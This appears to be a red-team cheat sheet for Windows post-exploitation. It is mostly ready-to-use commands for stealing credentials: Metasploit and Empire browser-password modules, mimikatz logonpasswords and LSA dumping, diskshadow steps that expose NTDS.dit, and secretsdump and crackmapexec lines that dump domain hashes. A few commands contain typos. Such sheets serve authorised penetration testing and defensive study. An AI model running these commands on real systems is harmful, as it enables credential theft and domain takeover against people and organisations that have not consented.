# Windows Post exploitation - information gathering
# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/

## Reading Event Logs
User must be in "Event Log Reader" group
For more info: https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/

Get-WinEvent -ListLog *

# Listing logs of a specific user
$cred = Get-Credentials
Get -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred

# Reading Security logs
(Get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessNam
e';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={
$_.Properties[8].Value }}).commandline

# Password Dump

## Metasploit
post/windows/gather/enum_chrome
post/multi/gather/firefox_creds
post/firefox/gather/cookies
post/firefox/gather/passwords
post/windows/gather/forensics/browser_history
post/windows/gather/enum_putty_saved_sessions

## Empire
collection/ChromeDump
collection/FoxDump
collection/netripper
credentials/sessiongopher

## mimikatz
privilege::debug
sekurlsa::logonpasswords

# Shadow copy
There might be a case where you are privileged but canâ€™t read-access to shadow files(NTDS.dit, SYSTEM etc.)

diskshadow.exe
set context persistent nowriters
add volume C: alias morph3
create
expose %morph3% Z:
# Deletion
delete shadows volume %morph3%
reset

# NTDS.dit dump
secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local
python crackmapexec.py 192.168.1.56 -u morph3 -p pass1234 -d evilcorp.com --ntds drsuapi
# on DC, lsass.exe can dump hashes
lsadump::lsa /inject

